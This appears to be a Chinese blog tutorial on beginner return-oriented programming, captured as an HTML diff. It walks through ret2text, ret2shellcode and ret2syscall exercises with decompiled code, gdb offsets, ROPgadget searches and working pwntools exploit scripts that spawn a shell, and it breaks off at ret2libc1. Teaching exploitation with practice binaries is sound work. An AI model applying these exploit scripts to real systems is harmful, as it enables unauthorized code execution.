@@ -1,0 +1,1008 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/image/atom1.png">
+  <link rel="icon" href="/image/atom1.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#153b6e">
+  <meta name="author" content="郭佳明">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="基本工具pwndbg 123git clone https:&#x2F;&#x2F;github.com&#x2F;pwndbg&#x2F;pwndbgcd pwndbg.&#x2F;setup.sh  checksec 123git clone https:&#x2F;&#x2F;github.com&#x2F;slimm609&#x2F;checksec.shsudo ln -sf ~&#x2F;checksec.sh&#x2F;checksec &#x2F;usr&#x2F;local&#x2F;bin&#x2F;checksec">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ROP入门">
+<meta property="og:url" content="http://gls.show/p/6cc1c464/index.html">
+<meta property="og:site_name" content="郭佳明的博客">
+<meta property="og:description" content="基本工具pwndbg 123git clone https:&#x2F;&#x2F;github.com&#x2F;pwndbg&#x2F;pwndbgcd pwndbg.&#x2F;setup.sh  checksec 123git clone https:&#x2F;&#x2F;github.com&#x2F;slimm609&#x2F;checksec.shsudo ln -sf ~&#x2F;checksec.sh&#x2F;checksec &#x2F;usr&#x2F;local&#x2F;bin&#x2F;checksec">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://gls.show/image/rop1.jpg">
+<meta property="article:published_time" content="2024-01-25T11:28:37.000Z">
+<meta property="article:modified_time" content="2024-01-25T11:28:37.000Z">
+<meta property="article:author" content="郭佳明">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://gls.show/image/rop1.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>ROP入门 - 郭佳明的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"gls.show","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>郭佳明的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/image/mountain1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ROP入门"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-25 19:28" pubdate>
+          2024年1月25日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          13k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          40 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">ROP入门</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    <!-- compatible with older versions-->
+                    本文最后更新于：2024年1月25日 晚上
+                  
+                
+              </p>
+            
+            <div class="markdown-body">
+              
+              <p><img src="/image/rop1.jpg" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://2603957456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-Me6KFbb12e2jzW1fcUM%2F-Me6N03HxfivnVlXvDsO%2Fimage.png?alt=media&token=415212b5-7a8f-405b-bdcf-a3875b2878f8" srcset="/img/loading.gif" lazyload></p>
+<h1 id="基本工具"><a href="#基本工具" class="headerlink" title="基本工具"></a>基本工具</h1><p>pwndbg</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg<br><span class="hljs-built_in">cd</span> pwndbg<br>./setup.sh<br></code></pre></td></tr></table></figure>
+
+<p>checksec</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/slimm609/checksec.sh<br><br>sudo ln -sf ~/checksec.sh/checksec /usr/local/bin/checksec<br></code></pre></td></tr></table></figure>
+
+<p>pwntools</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install python3-pip<br><br>python3 -m pip install pwntools<br></code></pre></td></tr></table></figure>
+
+<p>ROPgadget</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/JonathanSalwan/</span>ROPgadget.git<br><br>cd ROPgadget<br><br>sudo python setup.py install<br><br><span class="hljs-comment"># 遇到报错</span><br>pkg_resources.ResolutionError: Script <span class="hljs-string">&#x27;scripts/ROPgadget&#x27;</span> not found <span class="hljs-keyword">in</span> metadata at <span class="hljs-string">&#x27;/home/philo/.local/lib/python3.8/site-packages/ROPGadget-7.3.dist-info&#x27;</span><br><br>$ sudo cp -r <span class="hljs-regexp">/home/</span>philo<span class="hljs-regexp">/.local/</span>lib<span class="hljs-regexp">/python3.8/</span>site-packages/ROPGadget-<span class="hljs-number">7.3</span>.dist-info<br></code></pre></td></tr></table></figure>
+
+<p>LibcSearcher</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/lieanu/LibcSearcher.git<br><br>cd LibcSearcher<br><br>python setup.py develop # 如果权限不够加个sudo<br></code></pre></td></tr></table></figure>
+
+<h1 id="tldr"><a href="#tldr" class="headerlink" title="tldr"></a>tldr</h1><ul>
+<li>如果有<code>system(/bin/sh) </code>代码可以直接覆盖返回地址跳转，从而得到shell</li>
+<li>使用<code>asm(shellcraft.sh())</code>自行构造shellcode，将返回地址修改为可以执行的bss段的代码</li>
+<li>使用ROPgadget命令去找到gadget进行组合，利用pop+ret的机制对寄存器进行赋值，从而触发<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></li>
+</ul>
+<h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>ret2text指控制程序执行程序本身已有的的代码 (.text)</p>
+<p>checksec一下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">~&gt;</span><span class="bash"> checksec  --file=ret2text</span><br>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE<br>Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   83 Symbols     No       0               2       ret2text<br></code></pre></td></tr></table></figure>
+
+<p>f5，发现由于main函数中调用了gets函数，因此存在缓冲区溢出漏洞</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There is something amazing here, do you know anything?&quot;</span>);<br>  gets(s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Maybe I will tell you next time !&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>使用alt+t查找字符串，发现有<code>system(/bin/sh)</code>，因此可以使用ret2text的方式获得shell，将返回地址直接修改为0804863A即可</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">.rodata:<span class="hljs-number">08048763</span> command         db <span class="hljs-string">&#x27;/bin/sh&#x27;</span>,<span class="hljs-number">0</span>          ; DATA XREF: secure+<span class="hljs-number">3</span>D↑o<br>    <br>.text:<span class="hljs-number">0804863</span>A                 mov     dword ptr [esp], offset command ; <span class="hljs-string">&quot;/bin/sh&quot;</span><br>.text:<span class="hljs-number">08048641</span>                 call    _system<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>不小心关闭了窗口，想恢复可以点击Window-》reset desktop</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/image-20230320215831749.png" srcset="/img/loading.gif" lazyload></p>
+<p>gets函数被调用时写入字符串aaaaa，观察可以发现缓冲区的起始地址，为<code>$esp+0x1c</code>，也即是0xffffd2ec</p>
+<blockquote>
+<p>下断点的几种方式：</p>
+<ul>
+<li>b *main+4</li>
+<li>b *0xffff1234</li>
+<li>b func_name</li>
+</ul>
+</blockquote>
+<p><code>$ebp-$esp-0x1c+4</code>就是缓冲区起始地址相对于返回地址的偏移</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">##!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)<br>target = <span class="hljs-number">0x804863a</span><br>sh.sendline(<span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x6c</span>+<span class="hljs-number">4</span>) + p32(target))<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">Traceback (most recent <span class="hljs-keyword">call</span> <span class="hljs-keyword">last</span>):<br>File <span class="hljs-string">&quot;payload.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">6</span>, in <span class="hljs-symbol">&lt;module&gt;</span><br><span class="hljs-keyword">sh</span>.sendline(<span class="hljs-string">&#x27;A&#x27;</span> * (<span class="hljs-number">0</span>x6c+<span class="hljs-number">4</span>) + p32(target))<br>TypeError: can <span class="hljs-keyword">only</span> concatenate str (not <span class="hljs-string">&quot;bytes&quot;</span>) <span class="hljs-keyword">to</span> str<br><br>需要使用<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;A&#x27;</span>而不是<span class="hljs-string">&#x27;A&#x27;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303202347078.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">~&gt;</span><span class="bash"> file ret2shellcode</span><br>ret2shellcode: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=47e6d638fe0f3a3ff4695edb8b6c7e83461df949, with debug_info, not stripped<br><span class="hljs-meta"></span><br><span class="hljs-meta">~&gt;</span><span class="bash"> checksec  --file=ret2shellcode</span><br>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE<br>Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   79 Symbols     No       0               3       ret2shellcode<br></code></pre></td></tr></table></figure>
+
+<p>与上一题不同，此次没有<code>system(/bin/sh)</code>可以直接跳转，需要我们自己构造shellcode</p>
+<ul>
+<li>我们输入的字符串会被复制到buf2（在bss段），可以使用vmmap命令查看这段地址是不是可执行的，如果可以执行，那么就将返回地址覆盖为buf2的地址</li>
+<li>使用gdb查看gets函数被调用时的栈帧情况，发现缓冲区在<code>esp+0x1c</code>的地方</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">lea     eax, [esp+0x1c]<br>mov     [esp], eax      ; s<br>call    _gets<br></code></pre></td></tr></table></figure>
+
+<p>注意line9</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No system for you this time !!!&quot;</span>);<br>  gets(s);<br>  <span class="hljs-built_in">strncpy</span>(buf2, s, <span class="hljs-number">0x64</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bye bye ~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br></code></pre></td></tr></table></figure>
+
+<p>构造exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br>shellcode = asm(shellcraft.sh()) <span class="hljs-comment">#生成shellcode</span><br>buf2_addr = <span class="hljs-number">0x804a080</span> <span class="hljs-comment">#将返回地址覆盖为buf2的地址</span><br><br>sh.sendline(shellcode.ljust(<span class="hljs-number">112</span>, <span class="hljs-string">&#x27;A&#x27;</span>) + p32(buf2_addr)) <span class="hljs-comment">#将shellcode不足112的部分用A填充，并且左对齐</span><br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>看一下填充的字符串</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">b</span>&#x27;jhh///sh/bin\x<span class="hljs-number">89</span>\xe<span class="hljs-number">3</span>h\x<span class="hljs-number">01</span>\x<span class="hljs-number">01</span>\x<span class="hljs-number">01</span>\x<span class="hljs-number">01</span>\x<span class="hljs-number">814</span>$ri\x<span class="hljs-number">01</span>\x<span class="hljs-number">011</span>\xc<span class="hljs-number">9</span>Qj\x<span class="hljs-number">04</span>Y\x<span class="hljs-number">01</span>\xe<span class="hljs-number">1</span>Q\x<span class="hljs-number">89</span>\xe<span class="hljs-number">11</span>\xd<span class="hljs-number">2</span>j\x<span class="hljs-number">0</span>bX\xcd\x<span class="hljs-number">80</span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x<span class="hljs-number">80</span>\xa<span class="hljs-number">0</span>\x<span class="hljs-number">04</span>\x<span class="hljs-number">08</span>&#x27;<br></code></pre></td></tr></table></figure>
+
+<h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>需要触发execve系统调用来获取 shell，也即是执行代码：<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">execve</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> argv[], <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> envp[])</span></span>;<br></code></pre></td></tr></table></figure>
+
+<p>对于32位程序，传参从左往右依次是： EBX、ECX、EDX、ESI、EDI、EBP，EAX寄存器存放系统调用号</p>
+<p>对于64位程序，传参从左往右依次是： RDI、RSI、RDX、R10、R8、R9 ，，RAX寄存器存放系统调用号</p>
+<p>在规划好寄存器之后，需要执行<code>int 0x80</code>命令去触发系统调用</p>
+<p>因此，为了执行上面代码，我们需要让寄存器满足：</p>
+<ul>
+<li>eax 保存 0xb （execve函数的系统调用号）</li>
+<li>ebx 保存字符串“/bin/sh”的地址（const char *filename）</li>
+<li>ecx 为0（char *const argv[]）</li>
+<li>edx为0（char *const envp[]）</li>
+</ul>
+<p>因此我们需要构造rop gadgets</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303211937744.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303211948901.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>EBP  0xffffd328</li>
+<li>ESP  0xffffd2a0</li>
+<li>缓冲区在esp上面0x1c的位置</li>
+<li><code>$EBP-$ESP-0x1c+4</code>是偏移</li>
+</ul>
+<p>寻找一些gadges：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">~&gt; ROPgadget --binary rop  --only <span class="hljs-emphasis">&#x27;pop|ret&#x27;</span> | grep <span class="hljs-emphasis">&#x27;ebx&#x27;</span><br><br>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret #pop_edx_ecx_ebx_ret<br><br>~&gt; ROPgadget --binary rop  --string <span class="hljs-emphasis">&#x27;/bin/sh&#x27;</span><br><span class="hljs-section">Strings information</span><br><span class="hljs-section">============================================================</span><br>0x080be408 : /bin/sh<br><br><span class="hljs-code"> ~&gt; ROPgadget --binary rop  --only &#x27;int&#x27;</span><br><span class="hljs-section">Gadgets information</span><br><span class="hljs-section">============================================================</span><br>0x08049421 : int 0x80<br><br>Unique gadgets found: 1<br><br>~&gt; ROPgadget --binary rop  --only <span class="hljs-emphasis">&#x27;pop|ret&#x27;</span> | grep <span class="hljs-emphasis">&#x27;eax&#x27;</span><br><br>0x080bb196 : pop eax ; ret<br></code></pre></td></tr></table></figure>
+
+<p>构造payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br><br>pop_eax_ret = <span class="hljs-number">0x080bb196</span><br>pop_edx_ecx_ebx_ret = <span class="hljs-number">0x0806eb90</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br>binsh = <span class="hljs-number">0x80be408</span><br>payload = flat(<br>    [<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, pop_eax_ret, <span class="hljs-number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, binsh, int_0x80])<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">~$</span><span class="bash"> checksec --file=ret2libc1</span><br>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE<br>Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   84 Symbols     No       0               1       ret2libc1<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> file ret2libc1</span><br>ret2libc1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, with debug_info, not stripped<br></code></pre></td></tr></table></figure>
+
+<p>源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;RET2LIBC 